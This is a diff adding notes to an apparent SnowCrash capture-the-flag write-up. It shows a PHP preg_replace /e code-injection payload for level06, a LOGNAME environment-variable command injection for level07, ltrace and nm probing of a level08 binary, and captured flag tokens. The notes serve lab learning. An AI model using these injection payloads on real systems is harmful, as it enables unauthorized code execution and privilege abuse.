@@ -128,8 +128,129 @@ $r = x($argv[1], $argv[2]); print $r;
 ?>
 
 # TODO
-create a file to sent to level06 php executable
-=========================================================
+create a file to sent to level06 php executable in tmp
+[x {${`getflag`}}]
+./level06 /tmp/flag06
 
+test :
+sent [x {hello.world}] => {hello x world}
+
+debug_info : 
+- argv2 not use
+- [x ..] to cal first function function x($y, $z)
+- {${`getflag`}} use in function y($m) return with no change to file_get_contents
+
+risk :
+The /e modifier evaluates the replacement as PHP code, which can be a security risk if the input is not properly validated or sanitized.
+$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
+
+If an attacker can control the input file or the second argument passed to the script ($argv[2]), they could potentially execute arbitrary PHP code within the y() function.
+This can lead to unauthorized code execution and pose a security risk.
+To mitigate this vulnerability, it is important to validate and sanitize user input before using it in such dynamic evaluation scenarios.
+You should carefully review and validate any input before passing it to functions like preg_replace with the /e modifier or executing it as code.
+It is generally recommended to use alternative approaches,
+such as using preg_replace_callback with a custom callback function, to achieve the desired functionality without introducing potential code injection vulnerabilities.
+
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+=========================================================
+level 07 :
+ltrace ./level07
+=> response 
+__libc_start_main(0x8048514, 1, 0xbffff7e4, 0x80485b0, 0x8048620 <unfinished ...>
+getegid()                                                                                                                                     = 2007
+geteuid()                                                                                                                                     = 2007
+setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                                                                                           = 0
+setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                                                                                           = 0
+getenv("LOGNAME")                                                                                                                             = "level07"
+asprintf(0xbffff734, 0x8048688, 0xbfffff46, 0xb7e5ee55, 0xb7fed280)                                                                           = 18
+system("/bin/echo level07 "level07
+ <unfinished ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                                                                                                                        = 0
++++ exited (status 0) +++
+===
+
+getenv("LOGNAME")                                                                                                                             = "level07"
+export LOGNAME=ls 
+
+level07@SnowCrash:~$ export LOGNAME="&& ls"
+level07@SnowCrash:~$ ./level07
+
+ls: cannot open directory .: Permission denied
+
+level07@SnowCrash:~$ export LOGNAME="&& getflag"
+level07@SnowCrash:~$ ./level07
+
+Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
+=========================================================
+level 08:
+
+level08@SnowCrash:~$ cat token 
+cat: token: Permission denied
+level08@SnowCrash:~$ ./level08 
+./level08 [file to read]
+level08@SnowCrash:~$ ./level08 token 
+You may not access 'token'
+level08@SnowCrash:~$ chmod +x token 
+chmod: changing permissions of `token': Operation not permitted
+level08@SnowCrash:~$ nm 
+.bash_logout  .bashrc       level08       .profile      token
+level08@SnowCrash:~$ nm level08 
+08049f28 d _DYNAMIC
+08049ff4 d _GLOBAL_OFFSET_TABLE_
+0804877c R _IO_stdin_used
+         w _Jv_RegisterClasses
+08049f18 d __CTOR_END__
+08049f14 d __CTOR_LIST__
+08049f20 D __DTOR_END__
+08049f1c d __DTOR_LIST__
+080488d0 r __FRAME_END__
+08049f24 d __JCR_END__
+08049f24 d __JCR_LIST__
+0804a030 A __bss_start
+0804a028 D __data_start
+08048730 t __do_global_ctors_aux
+080484d0 t __do_global_dtors_aux
+0804a02c D __dso_handle
+         w __gmon_start__
+08048722 T __i686.get_pc_thunk.bx
+08049f14 d __init_array_end
+08049f14 d __init_array_start
+08048720 T __libc_csu_fini
+080486b0 T __libc_csu_init
+         U __libc_start_main@@GLIBC_2.0
+         U __stack_chk_fail@@GLIBC_2.4
+0804a030 A _edata
+0804a038 A _end
+0804875c T _fini
+08048778 R _fp_hw
+080483b4 T _init
+080484a0 T _start
+0804a030 b completed.6159
+0804a028 W data_start
+0804a034 b dtor_idx.6161
+         U err@@GLIBC_2.0
+         U exit@@GLIBC_2.0
+08048530 t frame_dummy
+08048554 T main
+         U open@@GLIBC_2.0
+         U printf@@GLIBC_2.0
+         U read@@GLIBC_2.0
+         U strstr@@GLIBC_2.0
+         U write@@GLIBC_2.0
+level08@SnowCrash:~$ ltrace ./level08 token
+__libc_start_main(0x8048554, 2, 0xbffff7d4, 0x80486b0, 0x8048720 <unfinished ...>
+strstr("token", "token")                                                                                                                      = "token"
+printf("You may not access '%s'\n", "token"You may not access 'token'
+)                                                                                                  = 27
+exit(1 <unfinished ...>
++++ exited (status 1) +++
+
+
+
+=========================================================
+level 09 :
+
+=========================================================
 level 12 :
 check www
